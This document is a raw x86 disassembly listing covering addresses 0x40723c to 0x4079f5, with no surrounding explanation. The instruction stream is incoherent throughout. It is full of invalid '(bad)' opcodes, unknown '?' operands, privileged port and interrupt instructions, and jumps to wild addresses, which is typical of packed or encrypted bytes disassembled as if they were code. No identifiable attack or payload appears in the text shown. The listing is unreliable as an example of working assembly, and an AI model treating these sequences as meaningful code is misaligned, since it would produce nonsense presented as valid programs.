  40723c:	ss pop eax
  40723e:	xor    DWORD PTR [esp],0x17
  407242:	push   0x7f
  407244:	in     al,0x27
  407246:	jae    0x40725f
  407248:	dec    esi
  407249:	loopne 0x40720b
  40724b:	sti    
  40724c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40724d:	cmp    edi,DWORD PTR [ebx-0x38cc902a]
  407253:	in     al,dx
  407254:	cmp    eax,0xbf76687d
  407259:	into   
  40725a:	push   ebx
  40725b:	cli    
  40725c:	xor    cl,0xb5
  40725f:	(bad)  [ebx+0x21]
  407262:	test   eax,edx
  407264:	sub    eax,0xe36fb535
  407269:	outs   dx,DWORD PTR ds:[esi]
  40726a:	pop    esi
  40726b:	stos   BYTE PTR es:[edi],al
  40726c:	lods   al,BYTE PTR ds:[esi]
  40726d:	out    dx,eax
  40726e:	mov    ds:0x63aa4839,al
  407273:	inc    eax
  407274:	or     DWORD PTR [edx-0x66bba593],0x1194c209
  40727e:	xchg   DWORD PTR ds:0x296ce3e,ebx
  407284:	pop    DWORD PTR [esi]
  407286:	push   esi
  407287:	(bad)  
  407288:	push   0x449d596f
  40728d:	aaa    
  40728e:	(bad)  
  40728f:	int3   
  407290:	add    DWORD PTR [esp+ebx*1+0x50],ebp
  407294:	sub    BYTE PTR [ebx+0x16],bl
  407297:	push   DWORD PTR [edi+0x6d]
  40729a:	mov    ecx,eax
  40729c:	das    
  40729d:	xchg   edi,eax
  40729e:	adc    al,0x3
  4072a0:	and    ebp,ecx
  4072a2:	shl    DWORD PTR [ecx],1
  4072a4:	ins    DWORD PTR es:[edi],dx
  4072a5:	imul   ebp,ebx,0xffffff91
  4072a8:	jmp    0x31c1375c
  4072ad:	cli    
  4072ae:	dec    esi
  4072af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072b0:	adc    DWORD PTR [edx+ebp*2],ecx
  4072b3:	mov    ch,0x19
  4072b5:	sti    
  4072b6:	gs pop edx
  4072b8:	inc    ebx
  4072b9:	sar    BYTE PTR [edi-0x7c],0x8f
  4072bd:	outs   dx,DWORD PTR ds:[esi]
  4072be:	ret    
  4072bf:	fld    DWORD PTR [ecx*2+0x3be55c98]
  4072c6:	mov    al,ds:0x75127324
  4072cb:	adc    eax,0x14
  4072ce:	ficom  WORD PTR [eax+0x63]
  4072d1:	and    al,0xa1
  4072d3:	scas   eax,DWORD PTR es:[edi]
  4072d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072d5:	call   0xcba69cf4
  4072da:	ins    DWORD PTR es:[edi],dx
  4072db:	xlat   BYTE PTR ds:[ebx]
  4072dc:	pop    ds
  4072dd:	jae    0x40729c
  4072df:	xor    BYTE PTR [ebx-0x4036d550],bl
  4072e5:	popf   
  4072e6:	add    bl,BYTE PTR [esi+0x9]
  4072e9:	fst    st(0)
  4072eb:	sbb    al,0x40
  4072ed:	adc    eax,0x457dc1d8
  4072f2:	ret    
  4072f3:	pop    edx
  4072f4:	repz es xchg esp,eax
  4072f7:	shr    BYTE PTR [ebp-0x34316f46],0x94
  4072fe:	test   eax,0x2f85738f
  407303:	xlat   BYTE PTR ds:[ebx]
  407304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407305:	fdivr  QWORD PTR [eax]
  407307:	lea    edx,[ebx+esi*4]
  40730a:	adc    al,0x94
  40730c:	and    al,0x8
  40730e:	pusha  
  40730f:	out    dx,eax
  407310:	and    esi,DWORD PTR [edi-0x4b269021]
  407316:	rcr    BYTE PTR [edx],1
  407318:	ins    BYTE PTR es:[edi],dx
  407319:	lods   eax,DWORD PTR ds:[esi]
  40731a:	mov    ecx,ebp
  40731c:	imul   eax,ebp,0xe36937d4
  407322:	mov    esp,0x13d18b02
  407327:	cmp    dh,BYTE PTR [ebp+0x3f]
  40732a:	or     eax,0x4c3631ac
  40732f:	inc    esp
  407330:	test   BYTE PTR [esi+edi*8-0x167b66fe],al
  407337:	xlat   BYTE PTR ds:[ebx]
  407338:	add    BYTE PTR [ecx*8+0x656f19c],ch
  40733f:	shl    BYTE PTR [edx],0x7d
  407342:	push   eax
  407343:	adc    esp,ebx
  407345:	imul   edi,DWORD PTR [ecx+0x37],0xffffffdd
  407349:	clc    
  40734a:	fdivrp st(4),st
  40734c:	push   edi
  40734d:	xchg   esi,eax
  40734e:	loopne 0x4072da
  407350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407351:	imul   ecx,DWORD PTR [ebx],0xffffff9b
  407354:	daa    
  407355:	or     al,0x8a
  407357:	cmp    DWORD PTR [edi+edx*4+0x5ada3b2b],ebx
  40735e:	push   ebx
  40735f:	in     al,dx
  407360:	jo     0x407355
  407362:	sbb    eax,edx
  407364:	fild   DWORD PTR [eax+ebx*1-0x80]
  407368:	loop   0x407357
  40736a:	pop    es
  40736b:	add    BYTE PTR [ebp-0x2ed80c8d],ch
  407371:	inc    ecx
  407372:	outs   dx,DWORD PTR ds:[esi]
  407373:	outs   dx,BYTE PTR ds:[esi]
  407374:	sub    edi,esi
  407376:	add    BYTE PTR [edx-0x6c46665],0x6
  40737d:	jl     0x407308
  40737f:	int3   
  407380:	cmp    al,0x3b
  407382:	lahf   
  407383:	je     0x40734b
  407385:	shr    DWORD PTR [ebx+esi*4],cl
  407388:	nop
  407389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40738a:	mov    edx,0x7e381e22
  40738f:	nop
  407390:	cwde   
  407391:	stc    
  407392:	xchg   esi,eax
  407393:	pop    edx
  407394:	mov    ch,0x3b
  407396:	std    
  407397:	xor    eax,0x36cda4ca
  40739c:	xchg   edx,eax
  40739d:	out    0x93,eax
  40739f:	jnp    0x4073fa
  4073a1:	ins    BYTE PTR es:[edi],dx
  4073a2:	pop    eax
  4073a3:	cmp    edi,DWORD PTR [edi+0x1d035881]
  4073a9:	mov    ch,0x48
  4073ab:	mov    dl,0xfd
  4073ad:	adc    cl,cl
  4073af:	pop    ss
  4073b0:	fsubrp st(3),st
  4073b2:	stc    
  4073b3:	jno    0x407352
  4073b5:	mov    BYTE PTR [esi+0x4b],0xf9
  4073b9:	sub    al,0xfa
  4073bb:	pop    ecx
  4073bc:	lahf   
  4073bd:	xor    eax,0x7ba9f531
  4073c2:	fsubr  st,st(1)
  4073c4:	sahf   
  4073c5:	stc    
  4073c6:	or     DWORD PTR [edi],eax
  4073c8:	add    eax,0xb272d17e
  4073cd:	gs adc bh,ah
  4073d0:	int    0x3e
  4073d2:	push   0xffffffcd
  4073d4:	jae    0x4073cf
  4073d6:	test   bl,0xb2
  4073d9:	jno    0x407400
  4073db:	and    BYTE PTR [ebp+ebp*2-0x9c218b8],cl
  4073e2:	lock lods eax,DWORD PTR ds:[esi]
  4073e4:	or     DWORD PTR [edi-0x31],esi
  4073e7:	mov    ds:0xa24fa087,al
  4073ec:	mov    ebp,0x4bec9824
  4073f1:	leave  
  4073f2:	popa   
  4073f3:	(bad)  [eax+0x30523748]
  4073f9:	lods   al,BYTE PTR ds:[esi]
  4073fa:	xor    eax,0x495a84ee
  4073ff:	jecxz  0x4073d0
  407401:	push   eax
  407402:	xchg   esp,eax
  407403:	mov    ?,WORD PTR [edx]
  407405:	jb     0x407441
  407407:	or     al,0xca
  407409:	fcomp  DWORD PTR [ebp+edx*1+0x71732742]
  407410:	in     eax,dx
  407411:	pusha  
  407412:	mov    bh,0xe7
  407414:	xor    DWORD PTR [edx+0x37de839f],edi
  40741a:	sbb    al,0xca
  40741c:	and    BYTE PTR [esi+0x5978a6b9],0x14
  407423:	std    
  407424:	add    DWORD PTR [esi],ecx
  407426:	int    0x90
  407428:	scas   al,BYTE PTR es:[edi]
  407429:	stos   BYTE PTR es:[edi],al
  40742a:	push   ecx
  40742b:	jo     0x40743b
  40742d:	hlt    
  40742e:	jl     0x407496
  407430:	mov    esp,0x588ca8f0
  407435:	mov    eax,0xf6e73bc6
  40743a:	cmp    ch,ch
  40743c:	push   ebp
  40743d:	or     eax,0xccb7568f
  407442:	and    DWORD PTR [ebp+edx*8-0x242c707a],eax
  407449:	in     eax,dx
  40744a:	leave  
  40744b:	test   eax,0x90da77d3
  407450:	xor    eax,0x4bb10372
  407455:	or     DWORD PTR [eax],ebp
  407457:	xchg   ebx,eax
  407458:	xchg   esi,eax
  407459:	les    ebp,FWORD PTR [ebx+esi*1-0x7e]
  40745d:	std    
  40745e:	xchg   DWORD PTR [ebx],edx
  407460:	and    dl,ch
  407462:	or     al,0xb9
  407464:	mov    BYTE PTR [ebx+0x75169281],ch
  40746a:	xchg   esp,eax
  40746b:	hlt    
  40746c:	das    
  40746d:	push   ax
  40746f:	sbb    eax,0x81d78457
  407474:	cmc    
  407475:	sub    al,bh
  407477:	inc    ebx
  407478:	cdq    
  407479:	stc    
  40747a:	addr16 jg 0x407454
  40747d:	xlat   BYTE PTR ds:[ebx]
  40747e:	sub    dl,BYTE PTR [ecx+0x67]
  407481:	je     0x407494
  407483:	pop    esp
  407484:	add    BYTE PTR ds:0x1d54e72a,al
  40748a:	arpl   WORD PTR [eax],ax
  40748c:	push   0x31
  40748e:	xor    esi,DWORD PTR [edi-0x6ccca9ce]
  407494:	xchg   ebx,eax
  407495:	xchg   BYTE PTR ds:0x2b73df79,bh
  40749b:	add    BYTE PTR [edi+ecx*2],ah
  40749e:	xchg   esp,eax
  40749f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a0:	neg    dh
  4074a2:	jg     0x40749e
  4074a4:	jmp    0x8e620cc1
  4074a9:	pop    ecx
  4074aa:	inc    eax
  4074ab:	adc    al,BYTE PTR [edx+ecx*4-0x23]
  4074af:	scas   al,BYTE PTR es:[edi]
  4074b0:	loope  0x407455
  4074b2:	popf   
  4074b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b4:	mov    ch,dl
  4074b6:	test   eax,0x11200356
  4074bb:	sbb    al,0x38
  4074bd:	xchg   ebp,eax
  4074be:	repnz add ecx,0x11a2f212
  4074c5:	stc    
  4074c6:	xchg   DWORD PTR [esi-0x1],eax
  4074c9:	scas   al,BYTE PTR es:[edi]
  4074ca:	mov    DWORD PTR [edi-0x381f6ffc],ebp
  4074d0:	test   bh,ch
  4074d2:	popa   
  4074d3:	ds cld 
  4074d5:	in     al,0x10
  4074d7:	scas   eax,DWORD PTR es:[edi]
  4074d8:	scas   al,BYTE PTR es:[edi]
  4074d9:	mov    ebp,0xf280d9f5
  4074de:	mov    ss,ebp
  4074e0:	inc    eax
  4074e1:	dec    esi
  4074e2:	test   BYTE PTR [ebx+0x1e5d9a3c],bh
  4074e8:	mov    ds:0xce9f5691,al
  4074ed:	or     BYTE PTR [eax+0x1f],bl
  4074f0:	sbb    eax,0x7cd88c85
  4074f5:	cmp    al,0x60
  4074f7:	adc    eax,0x709db5e4
  4074fc:	aam    0xac
  4074fe:	in     eax,dx
  4074ff:	add    al,0x30
  407501:	adc    BYTE PTR [edx+0xa],ah
  407504:	mov    eax,0x87ae3601
  407509:	inc    eax
  40750a:	mov    ch,BYTE PTR gs:[edx]
  40750d:	out    dx,al
  40750e:	cmp    bh,bh
  407510:	xlat   BYTE PTR ds:[ebx]
  407511:	cld    
  407512:	pop    esp
  407513:	jo     0x407525
  407515:	xor    ebx,ecx
  407517:	out    0xd2,al
  407519:	out    dx,eax
  40751a:	pop    ecx
  40751b:	les    ebx,FWORD PTR [edx]
  40751d:	xchg   ebx,eax
  40751e:	push   ebx
  40751f:	in     al,dx
  407520:	push   0x806242df
  407525:	ins    DWORD PTR es:[edi],dx
  407526:	bound  ebx,QWORD PTR [ecx-0x2075ca11]
  40752c:	popa   
  40752d:	dec    esi
  40752e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40752f:	and    al,0xe5
  407531:	xlat   BYTE PTR ds:[ebx]
  407532:	cmp    DWORD PTR [ebx+0x57],0xffffffda
  407536:	mov    ah,0xa7
  407538:	jnp    0x407557
  40753a:	enter  0x4886,0xc4
  40753e:	out    dx,eax
  40753f:	dec    ecx
  407540:	daa    
  407541:	jg     0x4075a8
  407543:	or     ah,bl
  407545:	cmc    
  407546:	mov    edx,0x193c259
  40754b:	mov    bl,0x53
  40754d:	rcl    bl,cl
  40754f:	test   BYTE PTR [edi-0x2eef0343],al
  407555:	cld    
  407556:	lock fisttp DWORD PTR [edi+ecx*4-0x9]
  40755b:	int    0x16
  40755d:	mov    bh,0xa
  40755f:	add    DWORD PTR [edx-0x7e5f555],esp
  407565:	stos   DWORD PTR es:[edi],eax
  407566:	inc    esp
  407567:	and    al,0xdf
  407569:	lock pop ebp
  40756b:	mov    dh,0x41
  40756d:	push   edi
  40756e:	jp     0x4075e0
  407570:	fwait
  407571:	cmp    BYTE PTR [esi-0x9d0df84],al
  407577:	(bad)  
  407578:	fdiv   DWORD PTR [edx+0x1e]
  40757b:	fcomp  QWORD PTR [edi]
  40757d:	dec    edi
  40757e:	and    ecx,DWORD PTR [edi+0x16]
  407581:	bound  eax,QWORD PTR [esi-0x6b]
  407584:	inc    esi
  407585:	push   edi
  407586:	jp     0x4075e9
  407588:	dec    eax
  407589:	test   eax,edi
  40758b:	hlt    
  40758c:	sbb    dh,dh
  40758e:	or     DWORD PTR [ecx-0x71d72a1d],ecx
  407594:	dec    edi
  407595:	mov    eax,ds:0x73fafb4c
  40759a:	je     0x4075be
  40759c:	and    BYTE PTR [edi+0x4ac825b7],al
  4075a2:	cli    
  4075a3:	adc    al,0x22
  4075a5:	add    eax,0xec76a2ef
  4075aa:	mov    al,0xa6
  4075ac:	and    DWORD PTR [ebx+esi*8+0x2],esp
  4075b0:	test   eax,esp
  4075b2:	cwde   
  4075b3:	push   edi
  4075b4:	jno    0x40756e
  4075b6:	ret    0x30ee
  4075b9:	sbb    edi,DWORD PTR [ebx+esi*4]
  4075bc:	iret   
  4075bd:	stc    
  4075be:	push   es
  4075bf:	xor    ch,BYTE PTR [esi-0x8]
  4075c2:	pop    ebx
  4075c3:	jecxz  0x407640
  4075c5:	sub    dh,BYTE PTR [edx]
  4075c7:	mov    eax,0xfcf4fc66
  4075cc:	dec    eax
  4075cd:	sbb    DWORD PTR [ecx+0x15],ecx
  4075d0:	sbb    al,BYTE PTR ds:0x9f054e6a
  4075d6:	xor    DWORD PTR [edi],esi
  4075d8:	and    al,0xe4
  4075da:	push   cs
  4075db:	pop    ebx
  4075dc:	in     eax,dx
  4075dd:	(bad)  
  4075df:	ret    0x74f7
  4075e2:	inc    eax
  4075e3:	lahf   
  4075e4:	sti    
  4075e5:	ret    
  4075e6:	jo     0x40761a
  4075e8:	mov    ebx,?
  4075ea:	inc    ecx
  4075eb:	fnstenv [ebp-0x3f]
  4075ee:	mov    ah,0x3
  4075f0:	jmp    0x407583
  4075f2:	sub    edi,DWORD PTR [ecx]
  4075f4:	pop    ecx
  4075f5:	in     al,dx
  4075f6:	lods   eax,DWORD PTR ds:[esi]
  4075f7:	sbb    bh,BYTE PTR [eax-0x6]
  4075fa:	loop   0x4075e9
  4075fc:	call   0x7d39b5d5
  407601:	mov    eax,0x138ce461
  407606:	pop    esi
  407607:	lea    ecx,[ebx+eax*2-0x66]
  40760b:	test   bl,dl
  40760d:	push   ebp
  40760f:	cs push esp
  407611:	retf   0x7e80
  407614:	aad    0x86
  407616:	sar    DWORD PTR [edx+ebx*2],cl
  407619:	dec    esi
  40761a:	sti    
  40761b:	push   0x2f
  40761d:	sti    
  40761e:	dec    ecx
  40761f:	retf   
  407620:	sahf   
  407621:	(bad)  
  407623:	jp     0x407629
  407625:	mov    edi,0xce749ea6
  40762a:	xchg   edi,eax
  40762b:	les    esp,FWORD PTR [edi]
  40762d:	sub    DWORD PTR [ebx+0x60],0xf2c2a8c5
  407634:	adc    ebx,DWORD PTR [edx+0x61]
  407637:	fwait
  407638:	pushf  
  407639:	adc    eax,0xb062361c
  40763e:	call   0x4b607f83
  407643:	in     al,0x5
  407645:	lea    esp,ds:0x1abf00e5
  40764b:	icebp  
  40764c:	dec    esi
  40764d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40764e:	add    DWORD PTR [esi],ebp
  407650:	mov    ch,0x6f
  407652:	aam    0xa8
  407654:	loop   0x407604
  407656:	or     ebp,ecx
  407658:	sbb    al,0x5f
  40765a:	mov    ds:0xb9dce181,eax
  40765f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407660:	sub    al,0x24
  407662:	test   DWORD PTR ds:0xd069c90d,edx
  407668:	jno    0x407601
  40766a:	sub    al,0x5f
  40766c:	sub    DWORD PTR [edx-0x35b360a6],edi
  407672:	cwde   
  407673:	push   esp
  407674:	push   0x63d15f50
  407679:	(bad)  
  40767a:	popf   
  40767b:	mov    DWORD PTR [edx],esp
  40767d:	cmp    BYTE PTR [edx-0x3f],bh
  407680:	fwait
  407681:	mov    es,eax
  407683:	mov    ebp,DWORD PTR [edx+edi*4+0x63]
  407687:	jbe    0x407681
  407689:	mov    eax,0x38d472f4
  40768e:	(bad)  
  40768f:	adc    al,BYTE PTR [edx]
  407691:	inc    DWORD PTR [ebx+0x40]
  407694:	fcmovnb st,st(6)
  407696:	mov    ebp,0xe63fe4b2
  40769b:	and    eax,0x4c955ef3
  4076a0:	sbb    BYTE PTR [esi-0x7564df3f],bl
  4076a6:	(bad)  
  4076a7:	adc    BYTE PTR ss:[eax-0x17],bl
  4076ab:	pop    ss
  4076ac:	cmp    bh,dl
  4076ae:	push   cs
  4076af:	cmp    eax,0xc2b2fab5
  4076b4:	pop    esp
  4076b5:	lahf   
  4076b6:	scas   eax,DWORD PTR es:[edi]
  4076b7:	dec    ecx
  4076b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076b9:	lock pop es
  4076bb:	in     al,0x92
  4076bd:	xchg   esp,eax
  4076be:	dec    edi
  4076bf:	jmp    0x4076bc
  4076c1:	outs   dx,DWORD PTR ds:[esi]
  4076c2:	stos   BYTE PTR es:[edi],al
  4076c3:	loopne 0x40767b
  4076c5:	not    DWORD PTR [edx+ecx*8+0x4]
  4076c9:	pop    ecx
  4076ca:	mov    ebp,0xa4ca90ad
  4076cf:	pop    ds
  4076d0:	sbb    eax,0x367c0eb3
  4076d5:	mov    edx,0x3650b0b3
  4076da:	call   0x4199d52a
  4076df:	mov    dl,0xcd
  4076e1:	ror    DWORD PTR [edx-0x60],cl
  4076e4:	out    dx,eax
  4076e5:	jnp    0x4076a9
  4076e7:	inc    edi
  4076e8:	getsec 
  4076ea:	imul   edx,ecx,0xffffffda
  4076ed:	inc    ecx
  4076ee:	push   esp
  4076ef:	rcr    BYTE PTR [edi-0x68fafb7c],0x1c
  4076f6:	jl     0x407724
  4076f8:	lea    esi,gs:[esi+0x18]
  4076fc:	dec    esp
  4076fd:	cmp    edi,DWORD PTR [edx-0x68]
  407700:	mov    esp,0x8857d684
  407705:	xor    BYTE PTR [ecx+0x3e],cl
  407708:	(bad)  
  407709:	mov    ah,BYTE PTR [edi+0x27]
  40770c:	cld    
  40770d:	je     0x4076e1
  40770f:	test   al,0x26
  407711:	jb     0x407705
  407713:	mov    BYTE PTR ds:0xcf72127b,bh
  407719:	dec    ecx
  40771a:	jb     0x40774c
  40771c:	or     esp,ecx
  40771e:	call   0x96cea426
  407723:	out    dx,eax
  407724:	test   ecx,ebp
  407726:	mov    edi,ebp
  407728:	scas   eax,DWORD PTR es:[edi]
  407729:	test   BYTE PTR [ebx-0x73],ch
  40772c:	fscale 
  40772e:	ins    BYTE PTR es:[edi],dx
  40772f:	mov    edx,0x86c26136
  407734:	sahf   
  407735:	mov    dh,0x83
  407737:	fs push 0xc22fe51a
  40773d:	xor    ebx,DWORD PTR [ecx-0x213ead1e]
  407743:	dec    edx
  407744:	pop    es
  407745:	mov    DWORD PTR [edi],esp
  407747:	push   0x3
  407749:	aaa    
  40774a:	call   0x87e5acc0
  40774f:	add    eax,0x8ebfc07f
  407754:	mov    ch,al
  407756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407757:	xchg   ebx,eax
  407758:	lahf   
  407759:	lahf   
  40775a:	jmp    0x40778a
  40775c:	inc    ebp
  40775d:	or     BYTE PTR [ebp+0x58],0xab
  407761:	jo     0x407701
  407763:	cmp    BYTE PTR [edx-0x4c],al
  407766:	(bad)  
  407767:	xor    ch,ah
  407769:	push   0xffffffc7
  40776b:	js     0x40771c
  40776d:	js     0x4077ed
  40776f:	loop   0x407765
  407771:	add    DWORD PTR [edi],edi
  407773:	push   eax
  407774:	or     al,0xd9
  407776:	cmp    al,BYTE PTR [esi+eax*4-0x501e0d90]
  40777d:	inc    eax
  40777e:	daa    
  40777f:	mov    ds:0xef3ba81e,al
  407784:	mov    bh,BYTE PTR [edi+0x618a8500]
  40778a:	adc    dh,BYTE PTR [esi-0x67]
  40778d:	sub    BYTE PTR [edx+0x43],0xd2
  407791:	mov    WORD PTR [esp+eax*2+0x3f6fb269],?
  407798:	retf   0x18d7
  40779b:	stos   DWORD PTR es:[edi],eax
  40779c:	lods   al,BYTE PTR ds:[esi]
  40779d:	jno    0x40774d
  40779f:	xlat   BYTE PTR ds:[ebx]
  4077a0:	sar    BYTE PTR [edx+0x26],1
  4077a3:	aam    0xb
  4077a5:	mov    al,ds:0x3cdb03c5
  4077aa:	fistp  WORD PTR [edx+ebp*2+0x69]
  4077ae:	mov    ds:0x88ea3a25,eax
  4077b3:	adc    bl,BYTE PTR ds:0x1cae9f7f
  4077b9:	jmp    0xf2743b0e
  4077be:	les    edx,FWORD PTR [edi-0x63]
  4077c1:	mov    al,0xe8
  4077c3:	(bad)  
  4077c4:	fcomp  DWORD PTR [eax+0x7]
  4077c7:	out    0x71,eax
  4077c9:	add    DWORD PTR [ebx],edi
  4077cb:	cwde   
  4077cc:	push   esi
  4077cd:	jo     0x4077c9
  4077cf:	sub    DWORD PTR [ebp-0x10],ecx
  4077d2:	hlt    
  4077d3:	and    al,0x94
  4077d5:	lahf   
  4077d6:	scas   al,BYTE PTR es:[edi]
  4077d7:	inc    ebx
  4077d8:	and    edi,esi
  4077da:	add    al,0xe5
  4077dc:	out    0x1b,eax
  4077de:	call   0x6a6c0e29
  4077e3:	pop    esp
  4077e4:	push   esp
  4077e5:	jns    0x40779f
  4077e7:	fldcw  WORD PTR [ebp+0x1009c4c2]
  4077ed:	sub    ah,BYTE PTR [ebx-0x75]
  4077f0:	cmc    
  4077f1:	cmc    
  4077f2:	rcl    BYTE PTR [esi],1
  4077f4:	outs   dx,BYTE PTR ds:[esi]
  4077f5:	cmp    BYTE PTR [ecx-0x5ffd838f],dl
  4077fb:	or     dl,BYTE PTR ds:0xf4f18cff
  407801:	xchg   ebx,eax
  407802:	or     edi,DWORD PTR [edx+0xf]
  407805:	xchg   DWORD PTR [ebp-0x3f31d7ec],eax
  40780b:	adc    al,0x35
  40780d:	es jmp 0xc098ac09
  407813:	lods   al,BYTE PTR ds:[esi]
  407814:	sti    
  407815:	call   0x6fa5af53
  40781a:	sub    DWORD PTR [eax+0x503f0651],esp
  407820:	or     al,0x19
  407822:	cmp    cl,BYTE PTR [edx-0x2580ed40]
  407828:	loopne 0x4077e4
  40782a:	xchg   esp,eax
  40782b:	mov    bh,0x20
  40782d:	stc    
  40782e:	mov    cl,0xb8
  407830:	sub    edi,DWORD PTR [edx-0x2a7350b1]
  407836:	add    DWORD PTR [edx-0x4d],esi
  407839:	xchg   ecx,eax
  40783a:	enter  0x9350,0xd6
  40783e:	xlat   BYTE PTR ds:[ebx]
  40783f:	jecxz  0x4078a7
  407841:	mov    BYTE PTR [eax+0x7556f205],bh
  407847:	test   DWORD PTR [ebx+ebx*8+0x10d0718b],0x3eb3039c
  407852:	xlat   BYTE PTR ds:[ebx]
  407853:	test   BYTE PTR [eax],ah
  407855:	pop    eax
  407856:	mov    edx,0x63fcb1f0
  40785b:	data16 and ah,cl
  40785e:	outs   dx,BYTE PTR ds:[esi]
  40785f:	rcr    DWORD PTR [ecx+0x35],cl
  407862:	mov    al,0xf1
  407864:	mov    al,ds:0x1109ac8e
  407869:	xlat   BYTE PTR ds:[ebx]
  40786a:	xor    dh,ah
  40786c:	ror    DWORD PTR [edx+0x10],0x6a
  407870:	stc    
  407871:	jmp    0x4078af
  407873:	outs   dx,BYTE PTR ds:[esi]
  407874:	aad    0xfa
  407876:	jns    0x4078cb
  407878:	mov    gs,ebx
  40787a:	loopne 0x40788f
  40787c:	and    cl,dl
  40787e:	add    eax,0xa4d39b77
  407883:	dec    edx
  407884:	retf   
  407885:	call   0x1ba5a276
  40788a:	add    al,0x91
  40788c:	ret    
  40788d:	mov    ah,0x52
  40788f:	pop    ss
  407890:	cmc    
  407891:	xor    ebp,DWORD PTR [edi-0x2ea079e7]
  407897:	sahf   
  407898:	xchg   ch,al
  40789a:	jbe    0x40786f
  40789c:	xor    DWORD PTR [ebx+0x49],eax
  40789f:	or     BYTE PTR [ebp+0x3b087349],ah
  4078a5:	xchg   ecx,eax
  4078a6:	xchg   DWORD PTR [ebx-0x45],ecx
  4078a9:	mov    ah,0x50
  4078ab:	(bad)  
  4078ac:	push   0xffffffe2
  4078ae:	ss mov esp,0x9b051ae9
  4078b4:	mov    ds:0x7f4bf83e,eax
  4078b9:	(bad)  [ebx+ebp*8]
  4078bc:	push   es
  4078bd:	or     esi,edi
  4078bf:	out    0xa1,eax
  4078c1:	push   edi
  4078c2:	cdq    
  4078c3:	dec    eax
  4078c4:	mov    dh,0x50
  4078c6:	aaa    
  4078c7:	sbb    BYTE PTR [ebx-0x2c],ah
  4078ca:	and    al,0x77
  4078cc:	cmp    ah,dl
  4078ce:	mov    bl,0xbe
  4078d0:	xchg   DWORD PTR [eax-0x6],eax
  4078d3:	mov    ss,WORD PTR [ecx+0x75]
  4078d6:	mov    esp,0x1f8b9f7d
  4078db:	(bad)  
  4078dc:	imul   dl
  4078de:	or     al,0x4c
  4078e0:	xor    DWORD PTR [esp+eiz*4+0x6],ebx
  4078e4:	shl    dh,cl
  4078e6:	fwait
  4078e7:	ror    BYTE PTR [ebx],0x6d
  4078ea:	mov    dh,0x76
  4078ec:	sub    eax,0x89957652
  4078f1:	push   es
  4078f2:	cmp    eax,DWORD PTR [eax]
  4078f4:	xchg   esi,eax
  4078f5:	pop    ebx
  4078f6:	out    dx,eax
  4078f7:	xor    eax,0x8a531f4a
  4078fc:	and    eax,0x445c8f34
  407901:	jns    0x4078b6
  407903:	cmp    BYTE PTR [ebx],bl
  407905:	add    DWORD PTR [esi],esp
  407907:	mov    fs,esi
  407909:	mov    dl,0xe5
  40790b:	push   esp
  40790c:	jmp    0xd7015a47
  407911:	mov    esi,0x4cb4b2b3
  407916:	jg     0x407911
  407918:	and    ah,BYTE PTR [ebp-0x50]
  40791b:	nop
  40791c:	rol    DWORD PTR [eax+ecx*4],cl
  40791f:	test   eax,0xfa2c6b6f
  407924:	fnsave cs:[eax]
  407927:	popa   
  407928:	and    al,0x80
  40792a:	push   esi
  40792b:	inc    esp
  40792c:	mov    bl,0xaa
  40792e:	jecxz  0x40792f
  407930:	gs (bad) 
  407932:	sbb    eax,0xd9dda414
  407937:	mov    ds:0xa28ff1d,eax
  40793c:	aam    0x12
  40793e:	test   esi,esp
  407940:	adc    eax,0x68563994
  407945:	lods   al,BYTE PTR ds:[esi]
  407946:	push   esi
  407947:	xor    DWORD PTR [ecx-0x2b224252],edi
  40794d:	mov    bh,0x56
  40794f:	cli    
  407950:	sbb    dl,0xb5
  407953:	clc    
  407954:	xchg   DWORD PTR [edi+0x76],eax
  407957:	mov    ebx,0x16138edb
  40795c:	push   cs
  40795d:	mov    eax,ds:0xde577fba
  407962:	cmp    eax,0x81abf45
  407967:	mov    esi,0xdd9dea5f
  40796c:	gs xchg edi,ecx
  40796f:	push   es
  407970:	jns    0x407913
  407972:	sahf   
  407973:	mov    ecx,0x12ba2ea4
  407978:	xor    edi,DWORD PTR [ecx]
  40797a:	mov    BYTE PTR [esp+ecx*1-0x69],ch
  40797e:	scas   eax,DWORD PTR es:[edi]
  40797f:	jl     0x4079db
  407981:	retf   
  407982:	inc    edi
  407983:	arpl   dx,dx
  407985:	or     dh,BYTE PTR [ebx-0x3f]
  407988:	outs   dx,DWORD PTR ds:[esi]
  407989:	in     al,0xdf
  40798b:	push   ebp
  40798c:	test   DWORD PTR ds:0x99a830df,0xf99750cd
  407996:	inc    edi
  407997:	jae    0x4079f9
  407999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799a:	das    
  40799b:	xchg   esp,eax
  40799c:	jmp    0x64ed9414
  4079a1:	inc    esp
  4079a2:	test   eax,0xa5969928
  4079a7:	call   0x7e51b1f0
  4079ac:	pop    ds
  4079ad:	xchg   ebp,eax
  4079ae:	xor    BYTE PTR [ebx+0x47],ah
  4079b1:	in     eax,dx
  4079b2:	loop   0x40797b
  4079b4:	sub    bh,ch
  4079b6:	cli    
  4079b7:	imul   DWORD PTR [ecx-0x7b]
  4079ba:	packssdw mm2,QWORD PTR [ebx-0x1a946285]
  4079c1:	xchg   ebx,eax
  4079c2:	inc    ebp
  4079c3:	sar    DWORD PTR [ebx],0x6
  4079c6:	mov    ds:0x82b0c755,eax
  4079cb:	mov    esi,eax
  4079cd:	sub    BYTE PTR [eax-0x16ae3b69],bh
  4079d3:	inc    esp
  4079d4:	jno    0x407a0b
  4079d6:	fwait
  4079d7:	push   0xffffffc8
  4079d9:	or     DWORD PTR [edx+0x96c00f],0x7fbcaebf
  4079e3:	cmp    BYTE PTR [edx+0x3a13093a],dl
  4079e9:	xlat   BYTE PTR ds:[ebx]
  4079ea:	aaa    
  4079eb:	loop   0x407a50
  4079ed:	call   0xf90f7671
  4079f2:	(bad)
  4079f5:	xchg   BYTE PTR [ebx-0xbba743a],dh
